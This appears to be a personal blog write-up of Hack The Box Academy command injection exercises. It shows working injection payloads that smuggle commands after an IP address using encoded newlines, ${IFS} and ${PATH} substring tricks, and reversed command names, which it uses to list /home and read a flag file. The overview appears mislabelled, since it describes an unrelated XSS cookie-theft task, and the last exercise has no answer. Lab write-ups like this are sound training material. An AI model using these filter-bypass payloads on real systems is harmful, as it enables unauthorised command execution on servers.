---
layout: post
title:  "Hack The Box - Academy - Command Injections"
date:   2024-10-15 20:30
image:  /images/htb/cross-site-scripting/cross-site-scripting-logo.png
tags:   [command-injection,cbbh]
categories: [htbacademy]
---

><b>Overview:</b>
<br/><br/>
We are performing a Web Application Penetration Testing task for a company that hired you, which just released their new Security Blog. In our Web Application Penetration Testing plan, we reached the part where you must test the web application against Cross-Site Scripting vulnerabilities (XSS).<br/><br/>
Start the server below, make sure you are connected to the VPN, and access the /assessment directory on the server using the browser:<br/><br/>
Apply the skills you learned in this module to achieve the following:<br/><br/>
 1 Identify a user-input field that is vulnerable to an XSS vulnerability.<br/>
 2 Find a working XSS payload that executes JavaScript code on the target's browser.<br/>
 3 Using the Session Hijacking techniques, try to steal the victim's cookies, which should contain the flag
<br/>
<b>Links:</b>
<br/>
<a href="https://academy.hackthebox.com/module/109/section/1031">Command Injection</a><br/>
<a href="https://jacozwarts.github.io/images/htb/command-injection/Command_Injections_Module_Cheat_Sheet.pdf">Command Injection - Cheat Sheet</a><br/>
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space">PayloadsAllTheThings - Command Injection - Bypass without Space</a>

<hr/>

### Bypassing Other Blacklisted Characters - Exercises
#### Use what you learned in this section to find name of the user in the '/home' folder. What user did you find?
A gotcha I ran into was I didn't add a `space` between the `;` and command I'm waas trying to execute e.g.
`Incorrect payload: 127.0.0.1${LS_COLORS:10:1}$(rev<<<'imaohw')` <br/><br/>
`Correct payload with a encoded \n (%0a)`
```
127.0.0.1${LS_COLORS:10:1}%0a$(rev<<<'imaohw')
```
![Bypassing other blacklisted characters exercise gotcha](/images/htb/command-injection/bypassing-other-blacklisted-characters-gotcha.png)

#### Final payload:
Initially, I tried the following command but didn't retrieve the user in `/home`: `127.0.0.1${LS_COLORS:10:1}%0a{ls,-la}%0a${PATH:0:1}home`. The issue stemmed from using the encoded newline character (`%0a`) immediately after `{ls,-la}`, which caused the command to execute incorrectly.

`Correct payload:`
```
127.0.0.1${LS_COLORS:10:1}%0a{ls,-la}${IFS}${PATH:0:1}home
```
<hr/>

### Bypassing Blacklisted Commands
#### Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found.
```
127.0.0.1${LS_COLORS:10:1}%0a$(rev<<<'tac')${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```
<hr/>

### Advanced Command Obfuscation
#### Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1
```
```
<hr/>